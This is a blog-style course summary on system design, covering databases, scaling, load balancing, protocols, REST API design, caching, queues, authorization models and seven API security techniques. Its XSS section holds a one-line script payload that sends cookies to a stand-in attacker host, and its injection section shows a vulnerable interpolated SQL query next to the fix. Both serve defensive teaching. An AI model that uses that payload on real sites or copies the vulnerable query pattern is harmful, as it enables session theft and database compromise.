---
title: "System Design Mastery: The Complete Roadmap"
date: "2026-04-20"
description: "From single server to millions of users — a comprehensive guide to building scalable production systems."
tags: ["system-design", "architecture", "scalability", "databases", "api"]
readTime: "45 min"
---

## The Gap That Separates Seniors from Mid-Level Developers

Most developers cannot design systems or features from scratch. They can add to someone else's architecture with tasks with clear requirements on mature systems.

But ask them to design something from the ground up and most freeze.

That gap — the ability to make decisions, design tradeoffs, and build architecture with rough requirements — is exactly what separates mid-level from senior engineers.

Companies are not paying six figures for people who can code or follow instructions. They pay for architectural decisions, system performance, data storage optimization, and decisions that affect customers.

These are the exact concepts that get you to senior level.

---

## Part 1: Starting Small — The Single Server Foundation

Designing a system to support millions of users is challenging, but every complex system starts with something simple.

That is why we begin with a setup that supports just one single user, then expand gradually. Starting small lets us understand each core component before adding complexity.

### The Single Server Setup

Everything runs on one server: the web application, the database, the cache, and all other components.

```
Users → DNS → Server (Web App + API + Database)
```

The flow:
1. User types `app.demo.com`
2. Browser contacts DNS — maps domain to IP address
3. DNS returns server IP
4. Browser sends HTTP request to server
5. Server processes and returns HTML (browser) or JSON (mobile)

Traffic originates from two sources: web applications (HTML/CSS/JS) and mobile apps (API calls using JSON).

**Key takeaway:** Start small. Understand core components before scaling.

---

## Part 2: Web Tier vs Data Tier — The First Split

As user base grows, a single server cannot handle the load. We split:
- **Web tier** — handles web and mobile traffic
- **Data tier** — manages the database

This enables independent scaling of each layer.

---

## Part 3: Database Selection — SQL vs NoSQL

### Relational Databases (SQL)

Data structured in tables — columns (fields/attributes) and rows (records).

**Advantages:**
- Complex JOIN operations across multiple tables
- Strong data consistency and integrity (ACID transactions)
- Atomic transactions that either completely succeed or completely fail

**Examples:** PostgreSQL, MySQL, Oracle, SQLite

**Best for:** Well-structured data with clear relationships, financial applications, systems requiring transactional integrity.

### Non-Relational Databases (NoSQL)

Four main types:

| Type | Example | Best For |
|---|---|---|
| Document stores | MongoDB | JSON-like flexible records |
| Wide column stores | Cassandra | Massive scale, many write ops |
| Key-value stores | Redis, Memcached | Ultra-fast reads/writes, caching |
| Graph databases | Neo4j | Entity relationships, recommendations |

**Advantages:**
- Handle dynamic and large datasets without rigid structure
- Single document can contain related data (e.g. customers + orders + products in one record)
- Optimized for low latency and horizontal scalability

**Best for:** Unstructured data, massive scale, low latency requirements, recommendation engines.

### SQL vs NoSQL Decision Matrix

| Scenario | Choice |
|---|---|
| Well-structured data with relationships | SQL |
| Financial/banking systems (ACID needed) | SQL |
| Ultra low latency required | NoSQL |
| Unstructured or semi-structured data (JSON) | NoSQL |
| Massive scale for reads/writes | NoSQL |
| Recommendation engine (user activity in key-value) | NoSQL |

---

## Part 4: Vertical vs Horizontal Scaling

### Vertical Scaling (Scale Up)

Adding more resources (RAM, CPU) to the existing server.

**Pros:** Simple, works for moderate traffic  
**Cons:** Hard resource cap, no redundancy (single point of failure)

### Horizontal Scaling (Scale Out)

Adding more servers to share the load.

**Pros:** Higher fault tolerance (if one server fails, others keep serving), better scalability  
**Cons:** More complex infrastructure

Horizontal scaling is the standard for high-traffic applications.

---

## Part 5: Load Balancing

With multiple servers, how do requests get distributed?

A **load balancer** sits between clients and servers:
- Routes traffic to the server with least load
- Handles fault tolerance — stops sending traffic to failed servers
- Enables easy addition of new servers

```
Clients → Load Balancer → Server 1
                        → Server 2
                        → Server 3
```

---

## Part 6: Application Layer Protocols

### HTTP/HTTPS

The foundational protocol for web and mobile API communication.

### WebSockets

For real-time, bidirectional communication — chat apps, live feeds, gaming.

### AMQP (Advanced Message Queuing Protocol)

Asynchronous communication with message queues between producer and consumer. Use when you need guaranteed message delivery and async processing.

### gRPC (Google Remote Procedure Call)

High-performance RPC framework using HTTP/2 as transport. Best for:
- Microservice-to-microservice communication
- Systems where speed and payload size matter
- Polyglot environments (works across languages)

**Limitation:** Most browsers don't fully support gRPC — mainly used for internal services.

### Choosing the Right Protocol

| Factor | Recommendation |
|---|---|
| Simple request-response | HTTP |
| Real-time bidirectional | WebSockets |
| Microservices needing speed | gRPC |
| Async producer-consumer patterns | AMQP |
| Client compatibility requirements | Consider browser support |
| Payload size and encoding needs | Evaluate per use case |

---

## Part 7: Transport Layer — TCP vs UDP

### TCP (Transmission Control Protocol)

- **Reliable + ordered** delivery
- Three-way handshake establishes connection before sending data
- Resends lost packets, reorders out-of-order packets
- Adds overhead but guarantees accuracy

**Best for:** Payments, authentication, user data, financial systems — anywhere data loss is unacceptable.

### UDP (User Datagram Protocol)

- **Fast + lightweight** but unreliable
- No handshake, no delivery guarantee, no reordering
- If packets are lost, they are lost — no resend

**Best for:** Video calls, online gaming, live streaming — where old data doesn't matter and speed is critical.

> If you are on a video call and a packet is lost, you do not want the system to go back and resend it. You move forward with what is being said now.

### Quick Decision Guide

| Need | Protocol |
|---|---|
| Safety and reliability | TCP |
| Speed with acceptable data loss | UDP |
| Banking, payments, auth | TCP only |
| Video streaming, gaming, live | UDP |

---

## Part 8: REST API Design

RESTful APIs let different parts of a system communicate using standard HTTP methods.

### Core Principles

**Resources are nouns, not verbs:**
- ✅ `GET /products`, `GET /products/123`
- ❌ `GET /getProducts`, `GET /getProductById`

**Use HTTP methods properly:**
| Method | Purpose | Example |
|---|---|---|
| GET | Retrieve | `GET /orders` |
| POST | Create | `POST /orders` |
| PUT | Full update | `PUT /orders/123` |
| PATCH | Partial update | `PATCH /orders/123` |
| DELETE | Remove | `DELETE /orders/123` |

### URL Design Best Practices

```
# Good
GET /api/v1/markets?status=active&sort=name:asc&page=2
GET /api/v1/staff?market=Wuse+Market&authLevel=SUPERVISOR

# Avoid
GET /getAllMarkets.php
POST /createNewStaffRecord
```

### Status Codes

| Code | Meaning |
|---|---|
| 200 | OK |
| 201 | Created |
| 204 | No Content (delete success) |
| 400 | Bad Request (client error) |
| 401 | Unauthorized |
| 403 | Forbidden |
| 404 | Not Found |
| 429 | Too Many Requests |
| 500 | Server Error |

### Pagination, Filtering, Sorting

```bash
# Pagination
GET /api/v1/staff?page=1&limit=50

# Filtering
GET /api/v1/staff?market=Wuse+Market&authLevel=OFFICER

# Sorting
GET /api/v1/staff?sort=last:asc,hireDate:desc

# Combined
GET /api/v1/attendance?dateFrom=2026-04-01&dateTo=2026-04-20&market=Wuse&late=true&limit=100&offset=0
```

### Versioning

```
/api/v1/...
/api/v2/...
```

Breaking changes get a new version. Old clients continue on v1 while new clients migrate to v2.

### Error Handling

Always return consistent error structure:

```json
{
  "error": {
    "code": "STAFF_NOT_FOUND",
    "message": "No staff member found with ID AMML-0001",
    "field": "staffId",
    "timestamp": "2026-04-20T08:30:00Z"
  }
}
```

---

## Part 9: Caching — Making Systems Fast

### Types of Cache

| Cache Type | Use Case | Example |
|---|---|---|
| CDN | Static assets near users | Cloudflare |
| In-memory | Hot data, session storage | Redis, Memcached |
| Browser | Repeated client requests | LocalStorage, IndexedDB |
| API response | Expensive computations | Redis with TTL |

### Cache Patterns

**Cache-aside (lazy loading):**
```
App → Cache → if miss → Database → Store in Cache → App
```

**Write-through:**
```
App → Database → Cache (simultaneously)
```

**TTL (Time To Live):**
Set expiration on cached data. Balance between freshness and performance.

### CDN for Static Assets

CDNs store static files (images, CSS, JS) at edge locations worldwide. Users download from the nearest server — significantly faster load times.

For the AMML app:
- Device logos and UI assets via CDN
- Attendance data stays in database (freshness > speed)

---

## Part 10: Message Queues — Async at Scale

When you need to process tasks asynchronously (email sending, report generation, biometric sync), you use a message queue.

```
Producer → Message Queue → Consumer Worker → Processing

Producer (API) → Queue → Email worker → Send email
Producer (ZK Device) → Queue → Sync worker → Import logs
```

**Benefits:**
- Decouple services — producers and consumers work independently
- Handle traffic spikes — queue absorbs burst traffic
- Reliability — messages are persisted until processed

**Common systems:** RabbitMQ, Apache Kafka, AWS SQS

---

## Part 11: Authorization Models

Authorization controls what authenticated users can access.

### RBAC (Role-Based Access Control)

Users assigned to roles, each role has defined permissions.

| Role | Permissions |
|---|---|
| Super Admin | Full access — create, read, update, delete, manage users |
| Manager | Dashboard, markets, attendance, staff, devices, reports, alerts |
| Supervisor | Dashboard, attendance, staff, reports, alerts |
| Officer | Dashboard, personal attendance, notices only |

This is the most common authorization model and maps exactly to the AMML system design.

### ABAC (Attribute-Based Access Control)

Uses user attributes + resource attributes + environment conditions.

```javascript
// Example policy
if (user.department === 'HR' && resource.confidentiality === 'internal') {
  allow read access
}
```

More flexible but more complex. Combines with RBAC for fine-grained control.

### ACL (Access Control Lists)

Each resource has its own permission list.

```
Document "Q1 Report":
  - Alice: read
  - Bob: read + write
  - Carol: none
```

Used by Google Docs, file systems. Highly specific but harder to scale with millions of objects.

### OAuth 2.0 — Delegated Authorization

When a third-party app needs to access your resources on your behalf:

```
User → Third-party app → GitHub → Access Token (not password) → Third-party app
```

You approve specific permissions. The token carries only the permissions you granted — not your password.

### JWT (Bearer Tokens)

Once authenticated, systems use tokens (typically JWT) carrying:
- User ID
- Roles (admin, editor, viewer)
- Scopes (allowed operations)
- Expiration
- Issuer

```javascript
// Token sent with every request
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

// Server validates token and applies permission logic
```

---

## Part 12: API Security — Seven Proven Techniques

APIs are doors into your system. Unprotected doors let anyone walk in.

### 1. Rate Limiting

Limit requests per client per time period.

```
User A: 100 requests/minute → allowed
User A: 101st request → blocked

Per endpoint: /comments → strict limit
Per IP address: block abusive IPs
Overall: protection against DDoS from botnets
```

### 2. CORS (Cross-Origin Resource Sharing)

Only allow requests from trusted domains.

```javascript
// Allow only your frontend domain
Access-Control-Allow-Origin: https://jedi.zo.space
```

Block requests from unknown domains attempting to use your API on behalf of users.

### 3. SQL and NoSQL Injection Prevention

Never include user input directly in database queries.

```javascript
// Dangerous — user input directly in query
db.query(`SELECT * FROM staff WHERE id = '${userInput}'`)

// Safe — parameterized query
db.query('SELECT * FROM staff WHERE id = ?', [userInput])
```

The first example allows attackers to inject malicious SQL. The second treats input as data, not code.

### 4. Web Application Firewalls (WAF)

Filter malicious traffic before it reaches your API.

AWS WAF example — blocks requests with:
- Suspicious SQL keywords
- Strange HTTP methods
- Known attack patterns

### 5. VPNs for Internal APIs

Internal tools (admin dashboards, data management) should only be accessible from within the company network.

```
External user → Blocked (not in VPN)
Internal employee → Access granted (connected to VPN)
```

### 6. CSRF (Cross-Site Request Forgery) Prevention

Prevents logged-in users from unknowingly making requests from other sites.

Solution: CSRF tokens in addition to session cookies.

```
Bank: checks session cookie + CSRF token
If token missing or mismatched → request blocked
```

### 7. XSS (Cross-Site Scripting) Prevention

Prevents attackers from injecting scripts into pages served to other users.

Example attack:
```
Attacker submits comment with: <script>document.location='evil.com?cookie='+document.cookie</script>

If unsanitized → script executes in every user's browser who views the comment
```

Solution: Sanitize and escape all user input before storing and rendering.

---

## Summary — The System Design Pillars

Building scalable systems from scratch requires mastery across:

1. **API Design** — REST, GraphQL, gRPC, WebSockets, AMQP. Choose based on communication patterns, performance needs, and client compatibility.

2. **Data Layer** — SQL for structured relational data with ACID needs. NoSQL (document, key-value, wide-column, graph) for scale, flexibility, and speed.

3. **Security** — Rate limiting, CORS, injection prevention, WAFs, VPNs, CSRF tokens, XSS sanitization. Layer your defenses.

4. **Scalability** — Horizontal over vertical scaling. Load balancers distribute traffic. Message queues handle async workloads. CDNs accelerate static assets.

The senior engineer's advantage is not knowing all the answers — it is asking the right architectural questions before writing the first line of code.

---

*Course by Hayk — System Design Mastery. Deeper dives into databases, caching, CDNs, production infrastructure, and full case studies (WhatsApp, Spotify, TinyURL) on his YouTube channel.*